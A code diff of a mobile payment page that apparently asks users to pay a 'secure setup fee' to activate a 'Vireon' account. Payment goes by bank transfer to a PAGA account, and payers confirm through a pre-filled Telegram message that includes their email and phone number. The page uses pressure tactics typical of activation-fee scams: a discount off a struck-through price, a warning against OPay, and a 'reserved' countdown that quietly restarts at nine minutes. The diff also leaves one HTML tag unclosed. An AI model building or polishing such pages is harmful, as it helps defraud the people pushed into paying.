@@ -11,20 +11,17 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
     <style>
-        /* --- VIREON COLOR PALETTE & VARIABLES --- */
         :root {
             --vir-green-dark: #022b1c;
             --vir-green-main: #064e3b;
             --vir-emerald: #059669;
             --vir-gold: #d97706;
-            --vir-gold-glow: #fcd34d;
             --vir-black: #02120b; 
             --vir-white: #ffffff;
             
             --bg-color: #f2faf6;
             --text-dark: #062318;
             --text-muted: #3b5349;
-            --text-light: #8da499;
             
             --grad-primary: linear-gradient(135deg, #047857 0%, #10b981 100%);
             --grad-card: linear-gradient(135deg, #021a24 0%, #033446 45%, #05728a 200%);
@@ -49,7 +46,6 @@
             padding: 20px 18px;
         }
 
-        /* --- HEADER --- */
         .page-header {
             display: flex;
             align-items: center;
@@ -77,7 +73,6 @@
             color: var(--text-dark);
         }
 
-        /* --- SELECTED PLAN BADGE & TIMER --- */
         .plan-badge-container {
             display: flex;
             align-items: center;
@@ -116,7 +111,6 @@
             letter-spacing: 0.5px;
         }
 
-        /* --- GRADIENT AMOUNT CARD --- */
         .amount-card {
             background: var(--grad-card);
             border-radius: var(--radius-lg);
@@ -177,7 +171,6 @@
             font-weight: 500;
         }
 
-        /* --- TRANSFER BOX --- */
         .transfer-card {
             background: var(--vir-white);
             border-radius: var(--radius-md);
@@ -246,7 +239,6 @@
             transition: 0.2s;
         }
 
-        /* --- HOW TO PROCEED --- */
         .instructions-card {
             background: var(--vir-white);
             border-radius: var(--radius-md);
@@ -272,7 +264,6 @@
             flex-shrink: 0;
         }
 
-        /* --- TELEGRAM ACTION BUTTON --- */
         .btn-telegram {
             width: 100%;
             background: #0088cc;
@@ -305,7 +296,6 @@
             gap: 6px;
         }
 
-        /* --- NOTIFICATION POPUP MODAL --- */
         .modal-overlay {
             position: fixed;
             top: 0;
@@ -395,24 +385,16 @@
             transition: 0.2s;
         }
 
-        .btn-modal-dismiss:active {
-            transform: scale(0.98);
-        }
+        .btn-modal-dismiss:active { transform: scale(0.98); }
     </style>
 </head>
 <body>
     <div class="modal-overlay active" id="noticeModal">
         <div class="notice-modal">
-            <div class="bell-badge">
-                <i class="fa-solid fa-bell"></i>
-            </div>
+            <div class="bell-badge"><i class="fa-solid fa-bell"></i></div>
             <h2 class="modal-title">Notification</h2>
-            <p class="modal-text">
-                Before making payment, please take note of this important notice
-            </p>
-            <p class="modal-warning">
-                ⚠️ Do NOT use OPay to make your payment, as it may lead to payment delays or unsuccessful confirmation
-            </p>
+            <p class="modal-text">Before making payment, please take note of this important notice</p>
+            <p class="modal-warning">⚠️ Do NOT use OPay to make your payment, as it may lead to payment delays or unsuccessful confirmation</p>
             <button class="btn-modal-dismiss" id="closeModalBtn">Okay, I Understand</button>
         </div>
     </div>
@@ -423,24 +405,19 @@
             <h1 class="page-title">Activate Account</h1>
         </div>
 
-        <!-- Selected Plan Badge -->
         <div class="plan-badge-container">
             <i class="fa-solid fa-crown"></i>
             <span class="plan-label">Your Plan:</span>
             <span class="plan-value" id="planDisplay">Premier Plan</span>
         </div>
 
-        <!-- Working Real-Time Timer (Bold & 9 Minutes) -->
         <div class="timer-bar">
             <i class="fa-solid fa-stopwatch"></i>
             <span>Reserved for: <strong id="timerText">09:00</strong></span>
         </div>
 
-        <!-- Amount Box -->
         <div class="amount-card">
-            <div class="tag-pill">
-                <i class="fa-solid fa-shield-halved"></i> SECURE SETUP FEE
-            </div>
+            <div class="tag-pill"><i class="fa-solid fa-shield-halved"></i> SECURE SETUP FEE</div>
             <div class="amount-title">REQUIRED AMOUNT</div>
             <div class="price-row">
                 <span class="old-price" id="oldPriceText">₦15,000</span>
@@ -449,11 +426,8 @@
             <div class="amount-footer">One-time payment to unlock all features</div>
         </div>
 
-        <!-- Bank Transfer Details Box -->
         <div class="transfer-card">
-            <div class="section-label-header">
-                <i class="fa-solid fa-building-columns"></i> Transfer To
-            </div>
+            <div class="section-label-header"><i class="fa-solid fa-building-columns"></i> Transfer To</div>
             <div class="bank-details-box">
                 <div class="bank-info">
                     <span class="bank-tag">PAGA / PAGATECH</span>
@@ -466,11 +440,8 @@
             </div>
         </div>
 
-        <!-- How To Proceed -->
         <div class="instructions-card">
-            <div class="section-label-header">
-                <i class="fa-solid fa-list-check"></i> How to Proceed
-            </div>
+            <div class="section-label-header"><i class="fa-solid fa-list-check"></i> How to Proceed</div>
             <div class="step-list">
                 <div class="step-item">
                     <div class="step-num">1</div>
@@ -491,7 +462,6 @@
             </div>
         </div>
 
-        <!-- Direct Telegram Button -->
         <a href="#" id="telegramBtn" class="btn-telegram">
             <i class="fa-paper-plane fa-solid"></i> Confirm on Telegram
         </a>
@@ -520,11 +490,13 @@
             let username = "Vireon User";
 
             if (savedData) {
-                const user = JSON.parse(savedData);
-                if (user.email) userEmail = user.email;
-                if (user.phone) userPhone = user.phone;
-                if (user.username) username = user.username;
-                else if (user.fullname) username = user.fullname;
+                try {
+                    const user = JSON.parse(savedData);
+                    if (user.email) userEmail = user.email;
+                    if (user.phone) userPhone = user.phone;
+                    if (user.username) username = user.username;
+                    else if (user.fullname) username = user.fullname;
+                } catch(e) {}
             }
 
             document.getElementById('planDisplay').innerText = planName;
@@ -539,18 +511,26 @@
 
             copyBtn.addEventListener('click', () => {
                 navigator.clipboard.writeText(accNum);
-                copyBtn.innerHTML = `<i class="fa-solid fa-check" style="color:#16a34a;"></i>`;
+                copyBtn.innerHTML = `<i class="fa-solid fa-check" style="color:#16a34a;">`;
                 setTimeout(() => {
                     copyBtn.innerHTML = `<i class="fa-regular fa-copy"></i>`;
                 }, 2000);
             });
 
-            // --- 3. WORKING REAL-TIME COUNTDOWN TIMER (9 Minutes Default) ---
+            // --- 3. FIXED COUNTDOWN TIMER LOGIC ---
             const timerDisplay = document.getElementById('timerText');
-            let totalSeconds = localStorage.getItem('vireon_timer_seconds');
+            let totalSeconds;
 
-            if (!totalSeconds || isNaN(totalSeconds) || totalSeconds <= 0) {
-                totalSeconds = 9 * 60; // Exactly 9 minutes
+            try {
+                const storedTime = localStorage.getItem('vireon_timer_seconds');
+                totalSeconds = storedTime ? parseInt(storedTime, 10) : NaN;
+            } catch (e) {
+                totalSeconds = NaN;
+            }
+
+            // If no valid stored time or time has expired, reset to 9 minutes (540 seconds)
+            if (isNaN(totalSeconds) || totalSeconds <= 0) {
+                totalSeconds = 9 * 60; 
             }
 
             function updateTimerUI() {
@@ -567,24 +547,26 @@
 
             const countdownInterval = setInterval(() => {
                 totalSeconds--;
-                localStorage.setItem('vireon_timer_seconds', totalSeconds);
+                try {
+                    localStorage.setItem('vireon_timer_seconds', totalSeconds);
+                } catch (e) {}
+                
                 updateTimerUI();
 
                 if (totalSeconds <= 0) {
                     clearInterval(countdownInterval);
                     timerDisplay.textContent = "00:00";
-                    localStorage.removeItem('vireon_timer_seconds');
+                    try {
+                        localStorage.removeItem('vireon_timer_seconds');
+                    } catch (e) {}
                 }
             }, 1000);
 
             // --- 4. TELEGRAM PRE-FILLED MESSAGE HANDLER ---
             const telegramBtn = document.getElementById('telegramBtn');
             const telegramUsername = "VIREON_OFFICIAL_MERCHANT";
-
             const messageText = `Hello Admin 👋\n\nI have successfully made payment for Vireon activation.\n\nKindly find my payment proof attached below for verification.\n\nEmail Address: ${userEmail}\nPhone Number: ${userPhone}`;
-
-            const encodedMessage = encodeURIComponent(messageText);
-            telegramBtn.href = `https://t.me/${telegramUsername}?text=${encodedMessage}`;
+            telegramBtn.href = `https://t.me/${telegramUsername}?text=${encodeURIComponent(messageText)}`;
         });
     </script>
 </body>
